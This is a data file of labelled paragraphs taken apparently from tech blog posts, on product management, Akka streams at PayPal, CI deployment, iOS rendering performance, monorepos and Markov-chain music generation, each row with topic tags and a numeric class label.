1721,"Now a big part about coming up with a deadline is that it is as much about the start as it is about the end date. Because the start date for work should also be the start date for which the end date has integrity. Think about it this way: you can say six of us are going to build this thing and were starting tomorrow. But if you havent yet figured out 1) the impact of your work on each group enumerated above, 2) how it relates to all the other code and all the other features, and 3) how it affects all the roadmapsyoure actually not ready to start. So it doesnt help anybody to declare the start date. Because whatever end date you have isnt going to work. Youre going to get a certain amount of the way through and youre going to think wow this is more than we thought, we have to go work with this other team, etc. Therefore I would say that probably equally important to the end date is the start date. Everything before the visualization we talked about is not the start date. The start date is the day after you have that visualization. Because then you know what youre going to build and the impact it is going to have. And your ability to predict the end date is now much more mechanical. You could mess up and be late but youre not going to discover something in the middle that you hadnt thought of before. Not enough companies think through the start date as much as they just start and then announce an end date. Part of what causes things to slip or look random is that they just werent ready to announce the start in the first place.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",1
1722,"My first rule of meetings is to just not have them and then work backwards. And I dont mean cliches like we have no meetings on Wednesdays, I mean dont have meetings until you know what youre going to accomplish. And the interesting thing about it is that what happens is invariably two things: 1) if you focus on having meetings that go back to the strategy and the plan it turns out most of the meetings you dont need, because you know exactly what people are working on; and 2) if you have meetings that are tied to the rhythm of the work youre doing, you have a far fewer number of meetings than the meetings where you think you need to know more. And the rhythm of the work is very different from the rhythm of the calendar. Things that you just say are weekly or daily or biweekly, theyre never connected to anything except the calendar. If you say you have a weekly meeting for engineering but engineering only tracks work every two weeks, then every other one of those meetings is annoying, because everyone is going to say that theyre getting the rest done next week.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",0
1723,"Couple no meetings with going through a process to determine what we were going to build and when were going to start and when were going to finish. When we do that, the status meetings are held at the milestones where everyone provides an update. It turns out you can manage thousands of people in this way. Because everyone was focused on the overall goal, things didnt change that much. So all other meetings are for people getting together to decide over the details of the work and who is going to work on it. So my answer to you is: dont have status meetings. Because you have a visualization of what youre going to do and you wrote down what youre going to do and everybody signed up to do it. And the status meeting is redundant with all of that. Theres a leap of faith there and I get it.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",0
1724,"How do we plan for staffing a cross-functional team? What are some best practices in engineer/PM/designer/data scientist ratios on teams? This is a very controversial topic for people. So your on your own in how you interpret it. :) What I find in most companies is that they are way under-invested in product management and have the right number of engineers; and probably under-invested in the whole idea of quality and operations. Im going to focus on the product part. The reason is that there is a feeling at early stage companies that product stuff that isnt coding is overheadits not capital-efficient to have product managers at an early-stage company, which is really true. But after you get to about 30 engineers, you cant manage that efficiently without product management. The engineers are just unable to spend time connecting the dots across all their systems.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",0
1725,"This is generally the path that people take: first they divide the product into a frontend and backend. Of course computer science people love that because you have an API, and you have a user interface thats separate from the data, and it all sounds greatexcept in all systems for all of software history, the best, most innovative features come from breaking the abstraction layers between the frontend and the backend. Everything interesting that anybody ever does in software comes when the frontend and backend people get together to create new abstractions and find new ways of working together. The minute you separate them, especially without product management, then everything gets resolved by, this is our API leave us alone, or this is the UI we want to do and were doing it. And it happens all over the place. The way to get this resolved is by having product managers (program managers at MS) to break through that notion.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",12
1726,"The numbers I offer people for how we worked effectively on products like Word and Excel generally blow peoples minds as either very inefficient or what did they all do all day. Take the team that built the UI for Office, thats 10 different products, 5000 icons and commands, 3000 menu items, and 1500 dialog boxes. It had, at its peak, about 40 engineers and 25 program (product) managers and a dozen designers. Start Excel and look at the surface area that needs to be designed and compare it to most any other product you useand that is just Excel (theres also Word, Power Point, Outlook, Share Point, and all the web versions of those). Yet oddly, most products, even much smaller products, have significantly more designers and design resources. Theres an efficiency gap in how the resources are applied and put to use.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",0
1727,"You definitely need to think about it holistically as growth in one part of the product can come at the expense of another. I need to add that one of the reasons that I believe that design and research work better as a centralized organization was primarily for the career path and learning of those people. If you have all the designers in one place, they know one anothers language and know who talk to. Even if you embed them, keeping the manager structure as such that they work for other designers is great. A design manager knows where to balance workload and where to deal with the interns, and all of the things come from having a community.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",12
1728,"Do you recommend an internal blog for internal discussions and ideas? If I had to do it all over again, I would wish for a tool like Twitter internally. Writing a lot of blog posts is truly exhausting. If you added up all the blog posts I did it internally over the course of running Windows it would come to around 750,000 words. But there was no other way. You have a team scattered across the globe. There are 10,000 people and you cant meet with all of them. You need a format that can be consumed later so you can the benefits of repetition. For example people want to know how fast you get promoted on the team. The old way of doing that is that you would connect them with someone in HR and People teams who would provide some generic guidelines. Alternatively as the person accountable for promotions, you write a blog post for how promotions work in your particular org, youd say, its the same system that the company uses but here is more detail. When you write it down, its easy to share later. You avoid the risk of people not absorbing it or making up their own version of what you said verbally a year ago. And topics cover processes for managing the team, industry dynamics (how people are perceiving the products), and of course the product (how do we decide on things I must have written 10 posts on the ratio question).","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",19
1729,"Twitter thread is of course my favorite way to do things now. When you start writing a blog post you get very fluffy and frothy in your language as if you were writing a speech. So this is how I do my Twitter threads: I have an Excel spreadsheet, and it has character counts in column B. What its forced me to do is to adhere to what I learned in my 8th grade on the 5-paragraph essay. Its 1 through 25 rows with 280 limits on each, down the whole column. I write the whole thing on my i Pad with a keyboard while waiting at the airport and hit Tweet when Im in the air. I did get the snarky you should start a blog reply on my threads and Im like, youre telling me this, I have like 10M blog words out there, and threading is now a feature, and they figured out how to render it well. I am pretty convinced that I am the only person who does threads with bullets.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",6
1730,"Who is in charge of innovation at a company? No one is an expert in everything and a product is complex and made up of many moving parts. How do you ensure you can empower experts at every step? Well you obviously get a Chief Innovation Officer and make sure theyre in charge of innovation. Thats a very common big company mistake, especially in consumer products. For some reason people think you can have innovation in a separate place from everybody doing everything else. At a big company anything innovative that you want to do is risky. At a big company, your notion of risk is skewed. If you were able to leave the company and evaluate the risk, you realize that the most risky thing that you can dream up at a company is at most a 2. And so youre far from thinking about what you can do thats a 10. Event though in your head youre thinking Omg, what if we did this, its going to be crazy! !, except its not a 10, its that your notion of risk is all messed up. Because of all the success around you.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",12
1731,"The important thing to understand is that its going to be way way more uncomfortable than you really believe. If youre comfortable and you think that your biggest risk is that theyre not going to finish on time, then its just not risky. The biggest lesson for me working at Microsoft was learning the ultimate example of product-market fit. Windows 95 was a ground-breaking product in 1995. Hundreds of millions of people got on the internet using America Online. It turns out it would be 12 years until Windows 7 shipped and everything in between was not the worlds best product. It was Windows XP which came 5 years after Windows 95. The problem was that as soon as it was released it was crushed by viruses and malware that the team had to quickly figure out how to fix. They were going to do a 9-month project that turned into 26 months and it wasnt until Windows XP Service Pack 2 that things got fixed and that wasnt until 2003. How good was Windows product-market fit? So good that it survived 12 years of not having a good product. And yet everybody was very busy the whole time. The lesson was this: if you have product-market fit, you can do a lot of bad stuff. The other best example of product-market fit that I have ever seen is Twitter. Which other product romanticized the fail whale and survived long enough to talk about it? And here we are today with 10X the number of users and for the most part you dont ever see the fail whale anymore.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",16
1732,"Look at the star to heart change, the world was going to end. It turns out it didnt really matter because you had product-market fit. And what those users were asking for was completely disconnected from the growth challenges that Twitter was facing. Your best customers dont want you to change the product. Everything I ever worked on was like that. Steven King writing a book in Word has very different needs than everybody else doing a one-page meeting agenda. For Outlook, administrative assistants who schedule meetings and book conference rooms in 8 time zones have very different needs than the normal people only getting spam everyday.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",17
1733,"Data is king at Pay Pal. Accurate data allows for more informed and better decisions. Pay Pal customer data is a treasure trove and is a major competitive differentiator. Our belief is that every employee should be empowered with timely insights to make data-driven decisions. We are at a vantage point to make this a reality. To meet these increasingly ambitious time-to-insights demands, our behavioral analytics platform will need to be agile and friction-less through the data collection, data transformation and insights generation phases.","['Big Data', 'Akka', 'Akka Streams', 'Akka Http', 'Scala']",6
1734,"Now the obvious questions that come to our minds is: The Reactive data processing pipeline collects the user behavior data for web and mobile Pay Pal products and provide us with enriched data to derive actionable insights. In this collector, each of the HTTP socket connections is its own stream as defined by Akka HTTP. We still want to siphon all the data into the main enrichment stream. Since the connection stream can come and go as we create new connections and close the connections, the merge point has to allow for change of these streams that feed into the enrichment flow. This can be achieved by using a dynamic fan-in component called Merge Hub. The enrichment stream just enriches the beacons and sends them to Kafka using the sink provided by the Reactive Kafka API.","['Big Data', 'Akka', 'Akka Streams', 'Akka Http', 'Scala']",11
1735,"But, there is a problem in this picture. Can you guess what that problem is? Kafka does re-balancing and re-partitioning from time to time. Now we have a completely back-pressured stream. So, what do we do when Kafka is unavailable? We cant possibly back-pressure the internet traffic, right? For this reason, we insert another component that breaks the back-pressure from the Kafka sink. But since a buffer can cause you to go out-of-memory, we built a persistent buffera buffer that writes the elements to disk via memory-mapped files. We are using a technology called Chronicle Queue behind this buffer.","['Big Data', 'Akka', 'Akka Streams', 'Akka Http', 'Scala']",3
1736,"Now the HTTP Flow, the HTTP part of the stream. This one gets materialized for every single connection. It looks up the enrich stream through its materialized valueguess whatthat Merge Hub.source actually materialized to a sink we can look up. Then it creates a normal HTTP flow which deserializes the beacon, pushes it to the enrichment flow, and at the same time creates an HTTP response responding back to the beacon generator. The key piece of this flow is this also To(enrich Stream) which pushes the beacons to the enrichment stream. This is in essence, a fan-outimplicitly.","['Big Data', 'Akka', 'Akka Streams', 'Akka Http', 'Scala']",11
1737,"About 15 minutes into the interview, she told me why she agreed to interview me. She told me Carmen saw how I was engaging with people at the youthspark event and saw how energetic I was and she is not getting that from me. As she was saying this, I was trying so hard not to cry as my eyes started getting teary. I felt like I was failing myself. Then Charl told me out of the three criterias (Previously disadvantaged, have a degree, must be female) she has for the role I tick only one and that is previously disadvantaged, the only reason she agreed to interview me was because of how Carmen described me and I was the only one who sent a CV with the timeframe they had. She asked me to show her what Carmen saw in me.","['Stories', 'Internships', 'Careers', 'Software Development', 'Learning']",2
1738,And then came 3rd generation computers in 1960s. These computers required compilers and interpreters to translate human friendly language into machine code. These computers were smaller and required user interactive software to be installed on the computers. 3rd generation computers could run multiple applications at a time. Different programming languages were introduced which were installed on to the computer. The hardware was still quite expensive but the flexibility of separating software from hardware presented numerous opportunities for improving the functionality.,"['Microservices', 'Technology', 'Architecture', 'Software Development']",16
1739,"Software evolution followed a similar cycle. This image summarises software evolution:1st Generation (late 1970s): Object oriented principals such as inheritance, encapsulation and polymorphism were introduced to enable code reusability and maintainability.2nd Generation (1990s): Applications were designed and implemented using layered architecture. Layered architecture was introduced to reduce tight coupling between different components of software applications. As a result, it was easier to test the software and time to deliver software was reduced. Applications were still monolithic (one single unit to encapsulate all functionalities).3rd Generation (2000s): Introduction of service oriented distributed applications. This design methodology introduced remoting, and enabled applications to be scaled and deployed onto multiple machines.","['Microservices', 'Technology', 'Architecture', 'Software Development']",16
1740,"Your code is good if it doesnt break each time there is an error. Which means there is good error handling. Indeed, errors are part of the software, it could come from many different elements. A user using the software in a way you didnt design for. Data that dont have the same format as you expected (via user input, API changes, etc). The number of concurrent users that you did not have in development mode or even network errors.","['Software Development', 'Startup', 'Web Development', 'Technology', 'Programming']",13
1741,"Is this part included in the sprint or not? Can we reduce the scope to have something working (even not perfectly) at the end of the sprint? Is this part core to the feature or a nice-to-have? Once you have a clear scope, you can start to do the technical conception. You can discuss: the name of your components, your API routes, the data format and what part of the codebase will be affected for instance. You dont need to discuss every implementation detail or spend hours discussing a function name. But think about the overall architecture and how different parts of you application will be connected. It will reduce the subjective decisions one person will have to make and thus improve the readability and the quality of the code.","['Software Development', 'Startup', 'Web Development', 'Technology', 'Programming']",1
1742,"How do you split the work? How do you avoid merge conflicts? How do you avoid people blocked by another? Those are the questions you ask yourself when you start working with a team. I have seen the team growing (up to 5 developers) and those challenges had to be addressed fast. When 5 people are working on a project, you cant afford to lose precious time. Say you loose 1.5 hours in a meeting that is not productive with your team and thats a day of work gone. Here are some principles we started as a team to limit the friction and stay productive.","['Software Development', 'Startup', 'Web Development', 'Technology', 'Programming']",1
1743,"During a sprint, one person will be more focus on one part of the application. It could be doing one component in the front, or implementing this API route. Its not necessarily only front-end versus back-end but it needs to be limited to some files that other people will not touch a lot. This is best if its not always the same people doing the same thing. The advantages are: everyone can modify every part of the app (limiting the bus factor), better quality as every line is challenged by other developers, and people learn new and diverse things.","['Software Development', 'Startup', 'Web Development', 'Technology', 'Programming']",1
1744,"Why were they going down this particular aisle? Why was it cold in this part of the supermarket? Why does cheese need to be refrigerated after all? Parents who are unable to deal with the persistent barrage of whys find the dialogue drifting off into the absurd, where they find themselves explaining why trollies have wheels, why shops exist, and why we even need to eat food in the first place. Adults find this behavior incredibly annoying. Children in the why phase manage to highlight just how much of the world that we, as adults, dont tend to spend too much time thinking about. As we age, we reason at ever more abstract levels that we dont need to be concerned with. For example, we dont care exactly how a car is put togetherwe just drive it. This ability to think abstractly and to build upon abstract concepts with even more abstract concepts has allowed the human race to flourish. Right now Im not thinking at all about how my keyboard works, or how my operating system works, or how machine code is being executed by the processor on my laptop.","['First Principles', 'Management', 'Leadership', 'Psychology', 'Software Development']",4
1745,"For example, if your boss approaches you saying you need to build something like Facebook for marketers, then the critical thinking that should have been done to fully explore the problem is being masked by analogy: of course, Facebook is successful, so if we just replicate that for another problem domain then it will definitely be a success, right? Instead, you need to think from first principles. What does Facebook for marketers actually mean? Is it about connecting marketers together? Is it about sharing insight or information with each other? Is it enabling communication within a company, or globally? Is it simply being able to easily search for data within their business? What problem exactly needs to be solved? Its always easier to reason by analogy than first principles. I recommend watching this video about first principles thinking by Elon Musk. Despite the extra brain power required, thinking in this way leads to better outcomes. In the video, Elon describes how thinking in analogy created an assumption in the industry that batteries would always be too expensive to build. But instead, thinking about the problem from first principles, by researching the cost of each individual component and calculating the cost per kilowatt hour, revealed that previous analogy was not at all true, unlocking Tesla as a business. And as of the time of writing, theyre doing pretty well.","['First Principles', 'Management', 'Leadership', 'Psychology', 'Software Development']",17
1746,"Its also very common to see the business requesting simple reports from the developers, e.g. the number of registrations by month for the past quarter. Maybe these rear their heads for investor meetings or quarterly all-hands, but they always point to a more subtle problemthe business lacks Business Intelligence tools. Spending half a day installing Metabase may not only prevent these requests coming through, but also empower other parts of the business to investigate your data and start making more informed decisions. One of our clients still raves about the impact Metabase had on the whole business over a year and a half later! Soon, when we have a bit more time is a popular response. The future always feels like itll be a little less busy, a little more structured. The truth is that future never comes; once the imminent hurdle is overcome the next challenge comes into view.","['Software Development', 'Management And Leadership']",0
1747,"Github Release is a great way to publish your software. It lets you create releases with notes and assets such as binary files, and works flawlessly with git tags to fit perfectly into your typical git workflow. However, this process is not automated, even less when your project needs to be compiled. Working with a continuous integration tool is therefore a necessity. I personally really like Jenkins, and felt the need to automate my release process for my new projects on Github, but I faced difficulties interfacing it with Github Release as, at the time of writing, no easy option exists to manage releases from Jenkins, and I couldnt find much information about such automation when searching on Google. So I thought it would be a good idea to share a simple guide to get started with Github Release and Jenkins.","['Jenkins', 'Github', 'Continuous Integration', 'DevOps', 'Automation']",18
1748,"I made some open source contributions to several projects before focusing on Ewasm, Ethereum-flavored Web Assembly, an initiative to replace the EVM (Ethereum Virtual Machine) with an upgraded, modern execution engine built on the Web Assembly VM. The project excites me because Ive always been interested in compilers and systems though I havent had a chance to touch anything so low-level since college. I also want to understand Ethereum as deeply and thoroughly as possible and I believe in starting at the bottom of the stack and working my way upand you dont get any lower than assembly and virtual machines . Of course, the team matters a lot too. I met several members of the Ewasm team at Dev Con III last year and joined one of the teams sprints earlier this year.","['Blockchain', 'Ethereum', 'Software Development', 'Virtual Machine', 'Governance']",2
1749,"Let me be very upfront about one thing: being a core developer is not glamorous and its not everyones cup of tea. Youre building extremely low-level infrastructure that the average person will never notice nor understand. (Good luck explaining to your parents and friends what you actually do.) The pay kinda sucks, other people will get rich and famous on the back of your work, you likely wont receive any credit, and you kind of have to be okay with that. We do very little interface work, and while DX (developer experience) is extremely important, we dont get much opportunity to think about UX (user experience) since end users will never interact directly with our software. Its the sort of job that requires a good deal of intrinsic motivation. If solving complex, fundamental problems, writing good, maintainable code, and building a platform that millions of people may someday use sounds like your idea of fun, thats a good start.","['Blockchain', 'Ethereum', 'Software Development', 'Virtual Machine', 'Governance']",2
1750,"We need many, many more core developers. Ethereum may seem reasonably mature but in fact there are only around 50100 Ethereum core developers in the world today building this essential layer one technology, supporting a community of application developers thats 100x larger and a user base thats at least 1000x larger. We aim to build a system for billions of humans, so we need people from all walks of life to contribute. Join the conversation in the All Core Devs channel. You can also find me and the rest of the Ewasm team on Gitter if youre interested in contributing to the Ewasm project. Were still in the process of improving our documentation and preparing to work with a broader community of contributors, so apologies as we get our house in order.","['Blockchain', 'Ethereum', 'Software Development', 'Virtual Machine', 'Governance']",10
1751,"Continuous Integration is awesome, but sometimes you need a buffer between auto-deploying things on merge and the production release. To do that with Circle CI requires some git branch-wrangling and a few lines of bash scripting. Well imagine a scenario where a deploy is trivial (ie. For more complicated build steps we should still be able to follow similar principles. This is not a Circle CI 2.0 workflows tutorial, its more of a git-flow/Circle CI hybrid to have 2 (or more) environments being released to and automatically deployed by Circle CI.","['Git', 'Circleci', 'Continuous Integration', 'Deployment']",18
1752,"Well want a develop and a master branch that get auto-deployed. Our default branch should be develop (ie. all pull requests should get merged into. Thats as simple as running: Were using branches because thats the only primitive that Circle CI understands. On Travis CI or Go CD you would be able to set up pipelines for each environment but Circle CI workflows cant be triggered for different environments manually, so its easiest to use git branches.1. Complete the task, get the code in a state to be merged3. Open a PR from the feature/task branch to `develop`1. Circle CI runs tests/lint whatever else (not covered in this post)2. Automated checks are all green 4. The PR is merged into `develop`1. Circle CI runs automated checks again2. Circle CI deploys to development/staging environment if all checks are green6. To deploy to production, the release has to be manual1. Circle CI runs automated checks again3. Circle CI deploys to production environment if all checks are green To make this process easier, well have some release scripts to automate step 6 (merging correctly is easy to do wrong) and some Circle CI config to do steps 5a-b and 6b-c.","['Git', 'Circleci', 'Continuous Integration', 'Deployment']",18
1753,"If we assume that via a sophisticated VFS a developer can clone and edit the entire codebase, the next question is how often does that actually happen? Im not talking about fixing a bug in an implementation of a shared library, as this type of fix is identically carried out whether using a monorepo or polyrepo (assuming similar build/deploy tooling as described in the previous section). Im talking about a library API change that has follow-on build breakage effects for other code. In very large code bases, it is likely impossible to make a change to a fundamental API and get it code reviewed by every affected team before merge conflicts force the process to start over again. Developers are faced with two realistic choices. First, they can give up, and work around the API issue (this happens more often than we would like to admit). Second, they can deprecate the existing API, implement a new API, and then go through the laborious process of individual deprecation changes throughout the codebase. Either way, this is exactly the same process undertaken in a polyrepo.",['Software Development'],13
1754,"In a service oriented world, applications are now composed of many loosely coupled services that interact with each other using some type of well specified API. Larger organizations inevitably migrate to an IDL such as Thrift or Protobuf that allow for type-safe APIs and backwards compatible changes. As described in the previous section on build/deploy management, code is not deployed at the same time. It might be deployed over a period of hours, days, or months. Thus, modern developers must think about backwards compatibility in the wild. This is a simple reality of modern application development that many developers would like to ignore but cannot. Thus, when it comes to services, versus library APIs, developers must use one of the two options described above (give up on changing an API or go through a deprecation cycle), and this is no different whether using a monorepo or polyrepo.",['Software Development'],10
1755,"Scaling a single VCS to hundreds of developers, hundreds of millions lines of code, and a rapid rate of submissions is a monumental task. Twitters monorepo roll-out about 5 years ago (based on git) was one of the biggest software engineering boondoggles I have ever witnessed in my career. Running simple commands such as git status would take minutes. If an individual clone got too far behind, it took hours to catch up (for a time there was even a practice of shipping hard drives to remote employees with a recent clone to start out with). I bring this up not specifically to make fun of Twitter engineering, but to illustrate how hard this problem is. Im told that 5 years later, the performance of Twitters monorepo is still not what the developer tooling team there would like, and not for lack of trying.",['Software Development'],10
1756,"Here you can find the first part. Watch the full talk here: If you have done a lot of profiling and you have found all your bottlenecks, sometimes there are still performance problems. This is because of the way UI stuff works in i OS. Anytime you set frames or make UIViews, what actually happens under the hood is you make a CATransaction or the system makes it for you. And these get shipped off to a thing called the render server. The rendering server is in charge of doing animations. If you do a UIView animate With: whatever, that will all happen on the render server which is another thread and it handles all of the apps animations.","['iOS App Development', 'Mobile App Development', 'Business Apps', 'Mobile Developer', 'Developer Experience']",3
1757,"The first one is color blended layers. This is a really easy one to fix. And this brings us to the first section of performance police. Basically, a lot of apps have problems: even i Message, beloved Apple app, is doing a lot of not really great stuff. Here we see that there is a lot of red: Red means you have labels that have a white background. And then they are on top of another white background and for some reason, they are not set to be opaque. So the blender is blending these colors, white and white and resultantly getting a white color. For every pixel that has red it is doing extra calculations for no benefit, you still get white in the background.","['iOS App Development', 'Mobile App Development', 'Business Apps', 'Mobile Developer', 'Developer Experience']",14
1758,"The next rule: do not use the corner radius property. If you have a view and you set view.layer.orner Radius, then this is always introducing off-screen rendering. Instead, you can use a bezier path and the same kind of CGBitmap stuff from earlier. In this case, a UIGraphics context. This function operates with UIImage it takes in a size, does rounded corners based on that size and uses a bezier path to clip. Then we clip the image and return it from the UIImage context. So this will return a pre-rounded image instead of rounding the view that the image sits inside of.","['iOS App Development', 'Mobile App Development', 'Business Apps', 'Mobile Developer', 'Developer Experience']",14
1759,"One thing that does cause this to happen is the should Rasterize property of a CALayer. Its an option on a layer that allows you to cache textures that have been rendered. There are a lot of weird rules. Like if it has not been used in a certain amount of milliseconds, it will leave the cache. And then, if it leaves the cache, it will be off-screen rendered on every frame. It is not really worth the possible benefits it has. And it is hard to check down if it is actually benefiting you.","['iOS App Development', 'Mobile App Development', 'Business Apps', 'Mobile Developer', 'Developer Experience']",3
1760,"Here is how you set up a system trace template. You make this list of events that can happen. So number one is an image download. Two is an image decoding, and three is this tilt animation I added. Basically, you set up some extra options to see what colors are going to be. Basically, you send it a number like 1 or 2, it will be red or green based on what you send in there.","['iOS App Development', 'Mobile App Development', 'Business Apps', 'Mobile Developer', 'Developer Experience']",14
1761,"And then you have to call this function, either kdebug_signpost or kdebug_signpost_start and kdebug_ signpost_end. And they work off the code you passed in. So we set up those three events with those numbers. Then you pass in that number here. You pass it an object that is basically the key for this event. And then, the last number is the color. So 2 is like you know red or something.","['iOS App Development', 'Mobile App Development', 'Business Apps', 'Mobile Developer', 'Developer Experience']",3
1762,"Rule #2Avoid overdrawing if you are doing some kind of rendering app or even if you are doing something like a loading bar. A lot of times events will happen more than 60 frames per second. In that case, you can throttle this update of the UI by using a CADisplay Link. It has a property called preferred Frames Per Second. That is only for i OS 10 or higher. For older ones, you have to do it manually but it is still useful.","['iOS App Development', 'Mobile App Development', 'Business Apps', 'Mobile Developer', 'Developer Experience']",3
1763,"This is useful for only Objective-C. In Objective-C, when you call a method under the hood, you are actually calling Objective-C message send function (objc_msg Send()). If you are seeing this calls in traces taking up a large chunk of time, this is something you can actually get rid of easily. It is basically the cache table where you look up function pointers by giving it a name of some method. Instead of doing that lookup every single time you can cache the function pointer and just call it directly. It is at least twice as fast usually.","['iOS App Development', 'Mobile App Development', 'Business Apps', 'Mobile Developer', 'Developer Experience']",3
1764,"Do not use Swift if it is especially performance sensitive. It has got some really neat features. But it also uses more boilerplate going on inside to get a high level of functionality. If you want to be fast, you should go as close to the assembly as close to the low-level stuff as you can. And that will be faster because it is less code automatically.","['iOS App Development', 'Mobile App Development', 'Business Apps', 'Mobile Developer', 'Developer Experience']",9
1765,"If you are looking into the stuff if you thought it was interesting, there is a really good book called i OS and Mac OS: Performance Tuning by Marcel Weiher. It goes really in-depth into a lot of this stuff and a lot more past this. I also have a video series. I do videos for Ray Wenderlich. There is a practical instrument series I did that goes more in depth and that explains these things a little bit more and has some examples. So if you want to learn more about instruments specifically, you can watch that video series. And then, WWDC videosthere is a ton of them that explain different performance things like this.","['iOS App Development', 'Mobile App Development', 'Business Apps', 'Mobile Developer', 'Developer Experience']",5
1766,"Here are some of the most common scenarios where you may use your domain event log for high value outcomes: Helping to resolve nasty bugs during the development process Troubleshooting production issues Creating clean integrations with external or legacy systems (another blog is in the works for this)Providing customer support teams an audit log so they can assist customers (e.g. what the heck happened to my hotel reservation? )Enabling customers to self service their audit log (e.g. bank transactions)Feeding a machine learning or analytics engine with high quality data (another blog is in the works for this)Auditing applications by regulators or security teams Should you choose to build one of these features, there will still be effort required. Logging domain events does not magically produce features on its ownbut it will save you lots of time and money in the event you do need to build such a feature. Should such a day never arrive, no worrieslogging domain events will go a long way towards helping establish Domain Driven Design on your team, which is valuable in its own right. Should you abandon DDD altogether, youll lose a person week or two setting up the technical plumbing. This is the asymmetric payoff at work low investment, low potential downside, high potential upside.","['Software Architecture', 'Domain Driven Design']",10
1767,"aisatsana is the final track off Aphex Twins 2012 release, Syro. A departure from the synthy dance tunes which make up the majority of Aphex Twins catalog, aisatsana is quiet, calm, and perfect for listening to during activities which require concentration. But with a measly running time just shy of five and a half minutes, the track isnt nearly long enough to sustain a session of reading or coding. Playing the track on repeat isnt satisfactory; exact repetition becomes monotonous quickly. I wished there were an hour-long version of the track, or even better, some system which could generate an endless performance of the track without repetition. Since I build software for a living, I decided to try creating such a system.","['Music', 'Software Development', 'Programming', 'Generative Art', 'JavaScript']",5
1768,"A beat is an abstract unit of time. For example, I could tell you to snap your fingers on beats one and three, and clap your hands on beats two and four, and the resulting song would go snap, clap, snap, clap. The speed at which a song is played can be measured in beats per minute, or BPM. If I told you to play that same song at 60 BPM (or one beat per second), youd either be snapping or clapping with each tick of a clock, and it would take four seconds to play the whole song. aisatsana is played at 102 BPM.aisatsana follows a very simple pattern. If you start counting at the first note, every 16 beats contains a sequence of notes, which I call a phrase. For example, from 3 seconds to 12 seconds contains one phrase, and from 12 seconds to 21 seconds contains another phrase. The piece continues to play a new phrase every 16 beats until the end, for a total of 32 phrases.","['Music', 'Software Development', 'Programming', 'Generative Art', 'JavaScript']",5
1769,"Below Ive drawn out two four-beat phrases in standard musical notation. Ive also written the note names next to each note and the beat count at the top in case you dont read music. So to play phrase one, youd play an A on beat one, an F on beat two, an A again on beat three, and an F again on beat four. To play phrase two, youd play an E on beat one, a C on beat two, an A on beat three, and a C on beat four. Lets build a Markov chain to describe these two phrases. For the state names, Ill use a combination of the beat and the note, like 1A to describe an A played on beat one. Im also going to add a start and an end state to denote the beginning and end of a phrase. Ill use an arrow () to denote a transition from one state to another.","['Music', 'Software Development', 'Programming', 'Generative Art', 'JavaScript']",14
1770,"Beginning at start, theres a 50% chance of transitioning to 1A and a 50% chance of transitioning to 1E. Ill flip a coin; heads, we go to 1A, tails, we go to 1E. Golly, it landed heads, so now were at 1A. So far the phrase were generating looks like start1A.1A always transitions to 2F, so now we have start1A2F. Again, we can see that 2F always transitions to 3A, which puts us at start1A2F3A. Heres where things get interesting.3A has a 50% chance of transitioning to 4F and a 50% chance of transitioning to 4C. I could flip another coin to determine which state we select; lets say heads means we go to 4F and tails means we go to 4C. If I flip a coin and it lands on heads, well have generated a copy of the first original phrase (start1A2F3A4Fend). But if the coin lands on tails, well have generated a new phrase: start1A2F3A4Cend! If we take every possible path through our Markov chain, well see its capable of generating four phrases:start1A2F3A4Fend (original phrase one)start1A2F3A4Cend (new phrase)start1E2C3A4Cend (original phrase two)start1E2C3A4Fend (new phrase)Look at that! The Markov chain helped us generate two new phrases. If we played all four phrases in a row to someone who had never heard any of them, that person probably wouldnt be able to tell which ones were original and which were new. The phrases sound similar to each other because they were all built from the same Markov chain.","['Music', 'Software Development', 'Programming', 'Generative Art', 'JavaScript']",14
1771,"The first thing I needed was a digital representation of aisatsana to work with. While our little example above was easy to calculate and walk by hand, doing the same with aisatsana would take a very long time. Note that an audio file wouldnt work; I needed the actual instructions for playing the piece, like which notes are played and when. This is precisely what MIDI files are for, and the very nice folks who run the MIDM Database have a MIDI file for aisatsana! I wanted my system to run in the browser, so I decided to build my system in Java Script. While one could parse a MIDI file with Java Script, I preferred to work with something in a JSON format, and found a tool online to make the conversion for me. You can view the JSON output from the conversion here.","['Music', 'Software Development', 'Programming', 'Generative Art', 'JavaScript']",19
1772,"If you examine the JSON file above, youll see a property named tracks which is an array containing three objects, one of which has a non-empty property notes. notes is an array of objects, each of which includes a note name and the time in seconds at which the note is to be played. This is exactly the information needed to build a Markov chain! At this point, I must confess that theres a small difference between aisatsana and the phrases I used in the example above which affected how I built the Markov chain. In my example phrases, every note occurred on one of the beats. However, this isnt the case in aisatsana. Some of the notes occur halfway between two beats. Theres two ways one could adjust the chain-building strategy to account for this: Treat aisatsana as if it were played at 204 BPM, which is double the actual speed. This would mean each phrase is made of 32 beats instead of 16.","['Music', 'Software Development', 'Programming', 'Generative Art', 'JavaScript']",3
1773,"To build the Markov chain, I needed to know which half-beat each note is played on. The output of the MIDI file unfortunately doesnt indicate this information, but it does include the time of each note in seconds. Since we know the speed of the track is 102 BPM (beats per minute, remember? ), we can easily calculate the length of each half-beat. To do this, simply convert 102 BPM to seconds per half-beat. First, change 102 BPM to half-beats per minute: Then, convert it to seconds per half-beat: Now its easy to determine which half-beat each note occurs on. For example, any note played between 0 and 0.29 seconds can be attributed to the first half-beat. Notes played between 0.29 and 0.58 seconds are attributed to the second half-beat, and so on. Just iterate through the array of notes to determine which half-beat each note occurs on. In music production this process is called quantization.","['Music', 'Software Development', 'Programming', 'Generative Art', 'JavaScript']",3
